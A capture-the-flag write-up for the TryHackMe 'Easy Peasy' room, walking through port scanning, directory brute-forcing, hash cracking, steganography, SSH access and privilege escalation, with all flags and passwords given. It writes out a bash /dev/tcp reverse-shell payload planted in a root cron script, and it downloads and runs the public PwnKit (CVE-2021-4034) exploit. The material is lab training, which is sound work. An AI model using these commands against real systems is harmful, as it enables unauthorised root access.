# Easy Peasy

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/easypeasyctf.md

Room: https://tryhackme.com/room/easypeasyctf


---

## Target

```text
10.49.151.157
```

---

## Task 1. How many ports are open?

We start with a full TCP scan and include default scripts and version detection. This gives us a complete view of the attack surface instead of only looking at the top 1000 ports.

```bash
nmap -p- -sV -sC 10.49.151.157
Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-13 11:53 BST
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.49.151.157
Host is up (0.000077s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.50 seconds
```

There are three open ports:

- 80
- 6498
- 65524

### Answer

```text
3
```

---

## Task 2. What is the version of nginx?

The Nmap output already tells us exactly what is running on port 80.

```text
|_http-server-header: nginx/1.16.1
```

### Answer

```text
1.16.1
```

---

## Task 3. What is running on the highest port?

The highest port is `65524`, and Nmap shows:

```text
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
```

### Answer

```text
Apache
```

---

## Task 4. Using GoBuster, find flag 1.

The website on port 80 is a good place to start. We enumerate directories with a common wordlist.

```bash
gobuster dir -u http://10.49.151.157 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.151.157
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/hidden               (Status: 301) [Size: 169] [--> http://10.49.151.157/hidden/]
/index.html           (Status: 200) [Size: 612]
/robots.txt           (Status: 200) [Size: 43]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

root@ip-10-49-72-183:~# gobuster dir -u http://10.49.151.157/hidden -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.151.157/hidden
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 390]
/whatever             (Status: 301) [Size: 169] [--> http://10.49.151.157/hidden/whatever/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-49-72-183:~# gobuster dir -u http://10.49.151.157/hidden/whatever -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.151.157/hidden/whatever
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 435]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

The final page looks like a dead end at first glance, but viewing the source reveals a hidden Base64 string.

```text
view-source:http://10.49.151.157/hidden/whatever/
```

```html
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
	background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
	background-repeat: no-repeat;
	background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

Decode it:

```bash
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 --decode
flag{f1rs7_fl4g}
```

### Answer

```text
flag{f1rs7_fl4g}
```

---

## Task 5. Further enumerate the machine, what is flag 2?

At this point it makes sense to switch our attention to the Apache service on the high port. We enumerate that site separately.

```bash
gobuster dir -u http://10.49.151.157:65524 -w /usr/share/wordlists/dirb/common.txt -x txt, php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.151.157:65524
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 10818]
/.hta                 (Status: 403) [Size: 281]
/.hta.txt             (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htaccess.txt        (Status: 403) [Size: 281]
/.htaccess.           (Status: 403) [Size: 281]
/.hta.                (Status: 403) [Size: 281]
/.htpasswd.txt        (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/.htpasswd.           (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 10818]
/robots.txt           (Status: 200) [Size: 153]
/robots.txt           (Status: 200) [Size: 153]
/server-status        (Status: 403) [Size: 281]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

The `robots.txt` file is the important clue here.

```text
http://10.49.151.157:65524/robots.txt
```

```text
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

The custom user agent value is also flag 2. In the notes this was resolved using hashes.com.

```text
https://hashes.com/en/decrypt/hash
```

```text
a18672860d0510e5ab6699730763b250:flag{1m_s3c0nd_fl4g}
```

### Answer

```text
flag{1m_s3c0nd_fl4g}
```

---

## Task 6. Crack the hash with easypeasy.txt, What is flag 3?

The Apache page itself is worth checking directly as well.

```bash
curl http://10.49.151.157:65524/
```

Part of the response includes the third flag directly in the HTML:

```text
                           They are activated by symlinking available
                           configuration files from their respective
                           Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
			   *-available/ counterparts. These should be managed
                           by using our helpers
                           <tt>
                                a2enmod,
```

### Answer

```text
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

---

## Task 7. What is the hidden directory?

The same page also contains a hidden encoded string.

```text
curl http://10.49.151.157:65524/ also gives us,
```

```html
<body>
    <div class="main_page">
      <div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
```

The notes used CyberChef to identify and decode the value as Base62.

```text
https://gchq.github.io/CyberChef/#recipe=From_Base62('0-9A-Za-z')&input=T2JzSm1QMTczTjJYNmRPckFnRUFMMFZ1
```

Decoded result:

```text
/n0th1ng3ls3m4tt3r
```

### Answer

```text
/n0th1ng3ls3m4tt3r
```

---

## Task 8. Using the wordlist that provided to you in this task crack the hash. What is the password?

Browsing to the hidden directory reveals an image and a hash.

```text
http://10.49.151.157:65524/n0th1ng3ls3m4tt3r/
```

```html
<html>
<head>
<title>random title</title>
<style>
	body {
	background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
	background-color:black;


	}
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```

We save the hash to a file and crack it with John using the provided wordlist.

```bash
root@ip-10-49-72-183:~# john --wordlist=easypeasy.txt hash.txt
Warning: detected hash type "gost", but the string is also recognized as "HAVAL-256-3"
Use the "--format=HAVAL-256-3" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Panama"
Use the "--format=Panama" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "po"
Use the "--format=po" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Raw-Keccak-256"
Use the "--format=Raw-Keccak-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "skein-256"
Use the "--format=skein-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Snefru-256"
Use the "--format=Snefru-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Stribog-256"
Use the "--format=Stribog-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "raw-SHA256-opencl"
Use the "--format=raw-SHA256-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mypasswordforthatjob (?)
1g 0:00:00:00 DONE (2026-04-13 12:32) 33.33g/s 136533p/s 136533c/s 136533C/s mypasswordforthatjob..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The cracked password is:

```text
mypasswordforthatjob
```

That value is not the SSH password yet. It is used as the passphrase for the steghide extraction from the image.

```bash
root@ip-10-49-72-183:~# steghide extract -sf binarycodepixabay.jpg
Enter passphrase: 
wrote extracted data to "secrettext.txt".
root@ip-10-49-72-183:~# cat secrettext.txt 
username:boring
password: mypasswordforthatjob
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
root@ip-10-49-72-183:~# 
```

We then convert the binary string to plain text. The notes used CyberChef here.

```text
https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=MDExMDEwMDEgMDExMDAwMTEgMDExMDExMTEgMDExMDExMTAgMDExMTAxMTAgMDExMDAxMDEgMDExMTAwMTAgMDExMTAxMDAgMDExMDAxMDEgMDExMDAxMDAgMDExMDExMDEgMDExMTEwMDEgMDExMTAwMDAgMDExMDAwMDEgMDExMTAwMTEgMDExMTAwMTEgMDExMTAxMTEgMDExMDExMTEgMDExMTAwMTAgMDExMDAxMDAgMDExMTAxMDAgMDExMDExMTEgMDExMDAwMTAgMDExMDEwMDEgMDExMDExMTAgMDExMDAwMDEgMDExMTAwMTAgMDExMTEwMDE
```

That gives:

```text
iconvertedmypasswordtobinary
```

This is the actual SSH password.

### Answer

```text
iconvertedmypasswordtobinary
```

---

## SSH access and the user flag

Now that we have the username and real password, we can log in over SSH on port 6498.

```bash
root@ip-10-49-72-183:~# ssh boring@10.49.151.157 -p 6498
The authenticity of host '[10.49.151.157]:6498 ([10.49.151.157]:6498)' can't be established.
ECDSA key fingerprint is SHA256:hnBqxfTM/MVZzdifMyu9Ww1bCVbnzSpnrdtDQN6zSek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.49.151.157]:6498' (ECDSA) to the list of known hosts.
*************************************************************************
**        This connection are monitored by government offical          **
**            Please disconnect if you are not authorized	       **
** A lawsuit will be filed against you if the law is not followed      **
*************************************************************************
boring@10.49.151.157's password: 
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
You Have 1 Minute Before AC-130 Starts Firing
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
!!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
boring@kral4-PC:~$ ls
user.txt
boring@kral4-PC:~$ cat user.txt 
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

The note in the file is a good hint. The flag is ROT13 encoded.

```text
https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,''/disabled)ROT13(true,true,false,13)&input=c3ludHthMGp2Z2YzM3pmYTBlejR5fQ
```

Decoded user flag:

```text
flag{n0wits33msn0rm4l}
```

## Task 9. What is the user flag?

### Answer

```text
flag{n0wits33msn0rm4l}
```

---

## Task 10. What is the root flag?

### Intended privilege escalation path: writable root cron job

The room points toward a cron-based privilege escalation, so the first thing to do after gaining a user shell is check cron configuration.

```bash
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

That final line is the key. Every minute, root runs `.mysecretcronjob.sh` from `/var/www/`.

Next, check the ownership and permissions on the script.

```bash
boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
```

This is vulnerable because:

- The cron job runs every minute as root.
- The script is owned by `boring`.
- We can modify the script content.

We set up a listener on the attack box:

```bash
nc -lvnp 4444
```

Then overwrite the cron script with a reverse shell payload:

```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /var/www/.mysecretcronjob.sh
```

When cron executes the script as root, we receive a shell on our listener.

```bash
root@ip-10-49-72-183:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.49.151.157 50768
bash: cannot set terminal process group (1498): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# 
```

From there, move into the root home directory and read the root flag.

```bash
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Apr 13 04:49 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```

### Answer

```text
flag{63a9f0ea7bb98050796b649e85481845}
```

---

## Extra: privilege escalation the fun way

This is not the intended route for the room, but it is still a valid path and worth documenting because it came from normal post-exploitation enumeration.

Back on the `boring` SSH session, enumerate SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/pppd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/bin/ping
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
```

`/usr/bin/pkexec` stands out, so we check its version.

```bash
boring@kral4-PC:/var/www$ pkexec --version
pkexec version 0.105
boring@kral4-PC:/var/www$ 
```

Version `0.105` is vulnerable to **PwnKit (CVE-2021-4034)**.

On the attack box, download a common public proof of concept and host it.

```bash
root@ip-10-49-72-183:~# wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
--2026-04-13 12:56:28--  https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                            100%[==========================================================>]  17.62K  --.-KB/s    in 0.001s  

2026-04-13 12:56:28 (33.1 MB/s) - ‘PwnKit’ saved [18040/18040]

root@ip-10-49-72-183:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Download it to the target and run it.

```bash
boring@kral4-PC:/var/www$ cd /tmp
boring@kral4-PC:/tmp$ wget http://10.49.72.183:8000/PwnKit
--2026-04-13 04:57:52--  http://10.49.72.183:8000/PwnKit
Connecting to 10.49.72.183:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                               100%[===================================================================>]  17.62K  --.-KB/s    in 0s      

2026-04-13 04:57:52 (298 MB/s) - ‘PwnKit’ saved [18040/18040]

boring@kral4-PC:/tmp$ chmod +x PwnKit 
boring@kral4-PC:/tmp$ ./PwnKit 
root@kral4-PC:/tmp# whoami
root
```

This route also gets root, but the cron job is the intended answer for the room.

---
